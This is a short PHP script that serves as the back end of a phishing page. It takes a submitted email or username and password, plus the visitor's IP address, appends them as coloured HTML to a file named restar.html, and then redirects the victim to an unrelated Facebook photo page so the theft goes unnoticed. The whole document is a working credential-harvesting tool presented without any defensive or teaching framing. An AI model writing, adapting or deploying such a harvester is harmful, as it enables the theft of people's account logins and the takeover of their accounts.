<?php

$habbo = $_POST['usua']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("restar.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#FF1493">'.$habbo.'</font></b>] Password: [<b><font color="#1E90FF">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>]<br>');
fclose($f);

header("Location:https://www.facebook.com/pages/Im%C3%A1genes-Fantasticas/760078754051687?sk=photos_stream");
?>
